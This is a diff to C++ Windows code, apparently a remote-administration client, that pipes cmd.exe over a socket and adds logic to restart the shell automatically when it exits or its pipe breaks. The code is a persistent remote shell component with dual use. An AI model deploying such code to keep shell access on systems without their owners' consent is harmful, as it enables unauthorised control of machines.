@@ -64,6 +64,9 @@ std::string ToUtf8(const char* data, int len) {
     return std::string(data, len);
 }
 
+// Forward declaration
+bool StartCmdProcess(SOCKET s);
+
 unsigned __stdcall ReadPipeThread(void* pParam) {
     char buffer[4096];
     DWORD bytesRead;
@@ -77,12 +80,50 @@ unsigned __stdcall ReadPipeThread(void* pParam) {
     SendResponse(g_socket, CMD_TERMINAL_DATA, startMsg.c_str(), (int)startMsg.size());
 
     while (bRunning) {
+        // Check if process is still running
+        if (hProcess) {
+            DWORD exitCode = 0;
+            if (GetExitCodeProcess(hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
+                // Process has exited
+                char codeMsg[128];
+                wsprintfA(codeMsg, "[System] cmd.exe 进程已退出 (Exit Code: %d)\r\n", exitCode);
+                SendResponse(g_socket, CMD_TERMINAL_DATA, codeMsg, (int)strlen(codeMsg));
+                
+                // Auto-restart the terminal process
+                std::string restartMsg = "[System] 正在自动重启终端...\r\n\r\n";
+                SendResponse(g_socket, CMD_TERMINAL_DATA, restartMsg.c_str(), (int)restartMsg.size());
+                
+                // Close old handles
+                if (hReadPipeOut) CloseHandle(hReadPipeOut);
+                if (hWritePipeIn) CloseHandle(hWritePipeIn);
+                CloseHandle(hProcess);
+                hReadPipeOut = NULL;
+                hWritePipeIn = NULL;
+                hProcess = NULL;
+                
+                // Restart cmd.exe process without creating new thread
+                if (!StartCmdProcess(g_socket)) {
+                    std::string failMsg = "[System] 自动重启失败，终端已关闭。\r\n";
+                    SendResponse(g_socket, CMD_TERMINAL_DATA, failMsg.c_str(), (int)failMsg.size());
+                    break;
+                }
+                // Continue with new process
+                continue;
+            }
+        }
+        
         if (ReadFile(hReadPipeOut, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
             buffer[bytesRead] = '\0';
             SendResponse(g_socket, CMD_TERMINAL_DATA, buffer, (int)bytesRead);
         } else {
             DWORD dwErr = GetLastError();
-            if (dwErr == ERROR_BROKEN_PIPE || dwErr == ERROR_INVALID_HANDLE) break;
+            if (dwErr == ERROR_BROKEN_PIPE || dwErr == ERROR_INVALID_HANDLE) {
+                // Pipe broken, likely process exited
+                std::string pipeMsg = "[System] 管道断开，检测进程状态...\r\n";
+                SendResponse(g_socket, CMD_TERMINAL_DATA, pipeMsg.c_str(), (int)pipeMsg.size());
+                Sleep(100); // Give time for process exit to be detected
+                continue;
+            }
             Sleep(10);
         }
     }
@@ -90,15 +131,6 @@ unsigned __stdcall ReadPipeThread(void* pParam) {
     std::string exitMsg = "[System] Terminal Thread Exited.\r\n";
     SendResponse(g_socket, CMD_TERMINAL_DATA, exitMsg.c_str(), (int)exitMsg.size());
 
-    // Debug: Check process exit code
-    if (hProcess) {
-        DWORD exitCode = 0;
-        if (GetExitCodeProcess(hProcess, &exitCode)) {
-            char codeMsg[64];
-            wsprintfA(codeMsg, "[System] Process Exit Code: %d\r\n", exitCode);
-            SendResponse(g_socket, CMD_TERMINAL_DATA, codeMsg, (int)strlen(codeMsg));
-        }
-    }
     return 0;
 }
 
@@ -123,12 +155,8 @@ void CloseTerminal() {
     hReadPipeIn = hWritePipeIn = hReadPipeOut = hWritePipeOut = NULL;
 }
 
-bool OpenTerminal(SOCKET s) {
-    // If already running, close first to ensure a fresh start
-    if (bRunning) {
-        CloseTerminal();
-    }
-
+// Helper function to start cmd.exe process (used by OpenTerminal and auto-restart)
+bool StartCmdProcess(SOCKET s) {
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     
     // 创建输出管道 (Child stdout -> Parent)
@@ -170,6 +198,7 @@ bool OpenTerminal(SOCKET s) {
         CloseHandle(hWritePipeOut);
         CloseHandle(hReadPipeIn);
         CloseHandle(hWritePipeIn);
+        hReadPipeOut = hWritePipeOut = hReadPipeIn = hWritePipeIn = NULL;
         return false;
     }
 
@@ -181,6 +210,19 @@ bool OpenTerminal(SOCKET s) {
     CloseHandle(hReadPipeIn);   
     hWritePipeOut = NULL;
     hReadPipeIn = NULL;
+
+    return true;
+}
+
+bool OpenTerminal(SOCKET s) {
+    // If already running, close first to ensure a fresh start
+    if (bRunning) {
+        CloseTerminal();
+    }
+
+    if (!StartCmdProcess(s)) {
+        return false;
+    }
 
     g_socket = s;
     bRunning = true;
